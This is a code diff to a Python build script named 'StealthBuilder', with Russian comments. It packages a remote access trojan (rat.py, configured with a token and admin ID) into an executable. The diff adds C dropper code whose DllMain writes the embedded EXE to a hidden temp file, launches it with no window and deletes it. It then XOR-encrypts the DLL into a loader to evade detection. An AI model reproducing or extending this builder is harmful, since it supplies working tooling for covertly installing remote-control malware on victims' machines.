@@ -1,4 +1,4 @@
-# build.py - Сборка EXE с зашифрованной DLL (БЕЗ ЭМОДЗИ)
+# build.py - Сборка EXE с зашифрованной DLL (СТАБИЛЬНАЯ ВЕРСИЯ)
 import os
 import sys
 import subprocess
@@ -6,6 +6,7 @@ import random
 import zlib
 import shutil
 import tempfile
+import struct
 
 class StealthBuilder:
     def __init__(self, token, admin_id):
@@ -18,7 +19,6 @@ class StealthBuilder:
         """Собирает обычный EXE с PyInstaller (со всем Python внутри)"""
         print("[+] Building EXE with PyInstaller...")
         
-        # Сначала собираем обычный EXE (как ты делал)
         cmd = [
             "pyinstaller",
             "--onefile",
@@ -52,10 +52,8 @@ class StealthBuilder:
             print(f"[-] PyInstaller error: {result.stderr.decode()}")
             return None
             
-        # Проверяем что файл создался
         exe_path = "dist/payload.exe"
         if not os.path.exists(exe_path):
-            # Пробуем другие имена
             for f in os.listdir("dist"):
                 if f.endswith(".exe"):
                     exe_path = os.path.join("dist", f)
@@ -65,56 +63,56 @@ class StealthBuilder:
             print("[-] EXE not found!")
             return None
             
-        # Переименовываем в payload.exe
         shutil.copy(exe_path, "payload.exe")
         size_mb = os.path.getsize('payload.exe') / (1024*1024)
         print(f"[+] EXE ready! Size: {size_mb:.1f} MB")
         return "payload.exe"
     
     def convert_exe_to_dll(self, exe_path):
-        """Конвертирует EXE в DLL (обертка)"""
+        """Конвертирует EXE в DLL (БЕЗ ЭМОДЗИ И СПЕЦСИМВОЛОВ)"""
         print("[+] Converting EXE to DLL...")
         
         # Читаем EXE
         with open(exe_path, 'rb') as f:
             exe_data = f.read()
         
-        # Создаем C-обертку для запуска EXE из DLL
-        dll_wrapper = '''
+        # Создаем DLL обертку на C (БЕЗ СПЕЦСИМВОЛОВ!)
+        dll_template = '''
 #include <windows.h>
 #include <stdio.h>
+#include <stdlib.h>
 
-// Встроенный EXE
-const unsigned char exe_data[] = {DATA};
-unsigned int exe_size = SIZE;
+static unsigned char exe_data[] = {DATA};
+static unsigned int exe_size = SIZE;
 
-void RunEXE() {
-    // Сохраняем во временный файл
+static void RunEXE() {
     char temp_path[MAX_PATH];
     char exe_path[MAX_PATH];
+    DWORD written;
+    HANDLE hFile;
+    STARTUPINFOA si;
+    PROCESS_INFORMATION pi;
+    
     GetTempPathA(MAX_PATH, temp_path);
     sprintf(exe_path, "%s\\\\tmp_%x.exe", temp_path, GetTickCount());
     
-    HANDLE hFile = CreateFileA(exe_path, GENERIC_WRITE, 0, NULL,
-                               CREATE_ALWAYS, FILE_ATTRIBUTE_HIDDEN, NULL);
-    if (hFile != INVALID_HANDLE_VALUE) {
-        DWORD written;
-        WriteFile(hFile, exe_data, exe_size, &written, NULL);
-        CloseHandle(hFile);
-        
-        // Запускаем EXE
-        STARTUPINFOA si = {sizeof(si)};
-        PROCESS_INFORMATION pi;
-        si.dwFlags = STARTF_USESHOWWINDOW;
-        si.wShowWindow = SW_HIDE;
-        
-        CreateProcessA(exe_path, NULL, NULL, NULL, FALSE,
-                      CREATE_NO_WINDOW, NULL, NULL, &si, &pi);
-        
-        // Удаляем через 5 секунд
-        Sleep(5000);
-        DeleteFileA(exe_path);
-    }
+    hFile = CreateFileA(exe_path, GENERIC_WRITE, 0, NULL,
+                        CREATE_ALWAYS, FILE_ATTRIBUTE_HIDDEN, NULL);
+    if (hFile == INVALID_HANDLE_VALUE) return;
+    
+    WriteFile(hFile, exe_data, exe_size, &written, NULL);
+    CloseHandle(hFile);
+    
+    ZeroMemory(&si, sizeof(si));
+    si.cb = sizeof(si);
+    si.dwFlags = STARTF_USESHOWWINDOW;
+    si.wShowWindow = SW_HIDE;
+    
+    CreateProcessA(exe_path, NULL, NULL, NULL, FALSE,
+                   CREATE_NO_WINDOW, NULL, NULL, &si, &pi);
+    
+    Sleep(5000);
+    DeleteFileA(exe_path);
 }
 
 BOOL APIENTRY DllMain(HMODULE hModule, DWORD reason, LPVOID lpReserved) {
@@ -125,15 +123,22 @@ BOOL APIENTRY DllMain(HMODULE hModule, DWORD reason, LPVOID lpReserved) {
     return TRUE;
 }
 '''
-        # Встраиваем EXE в DLL
-        # Преобразуем в C массив
-        hex_data = ', '.join([f'0x{b:02X}' for b in exe_data])
-        dll_wrapper = dll_wrapper.replace('{DATA}', hex_data)
-        dll_wrapper = dll_wrapper.replace('{SIZE}', str(len(exe_data)))
+        # Конвертируем EXE в HEX строку (без спецсимволов)
+        hex_parts = []
+        for i, b in enumerate(exe_data):
+            if i > 0 and i % 16 == 0:
+                hex_parts.append('\n    ')
+            hex_parts.append(f'0x{b:02X}, ')
         
-        # Сохраняем DLL код
-        with open('payload_dll.c', 'w') as f:
-            f.write(dll_wrapper)
+        hex_string = ''.join(hex_parts).rstrip(', ')
+        
+        # Заменяем плейсхолдеры
+        dll_code = dll_template.replace('{DATA}', hex_string)
+        dll_code = dll_code.replace('{SIZE}', str(len(exe_data)))
+        
+        # Сохраняем DLL код (в бинарном режиме для безопасности)
+        with open('payload_dll.c', 'w', encoding='utf-8') as f:
+            f.write(dll_code)
         
         # Компилируем DLL через MinGW
         cmd = [
@@ -191,7 +196,6 @@ BOOL APIENTRY DllMain(HMODULE hModule, DWORD reason, LPVOID lpReserved) {
         with open('loader.cpp', 'r') as f:
             loader = f.read()
         
-        # Встраиваем зашифрованную DLL
         loader = loader.replace(
             'extern unsigned char encrypted_dll[];',
             self.bytes_to_c_array(encrypted_dll, 'encrypted_dll')
@@ -253,7 +257,7 @@ BOOL APIENTRY DllMain(HMODULE hModule, DWORD reason, LPVOID lpReserved) {
         with open('rat.py', 'w', encoding='utf-8') as f:
             f.write(content)
         
-        # 2. Собираем обычный EXE через PyInstaller (80 MB)
+        # 2. Собираем обычный EXE через PyInstaller
         exe = self.build_exe_with_pyinstaller()
         if not exe:
             return False
@@ -280,7 +284,6 @@ BOOL APIENTRY DllMain(HMODULE hModule, DWORD reason, LPVOID lpReserved) {
             print(f"[+] DLL: {dll} ({os.path.getsize(dll) / (1024*1024):.1f} MB)")
             print(f"[+] Key: {self.xor_key.hex()}")
             
-            # Сохраняем ключ в файл
             with open('key.txt', 'w') as f:
                 f.write(self.xor_key.hex())
             
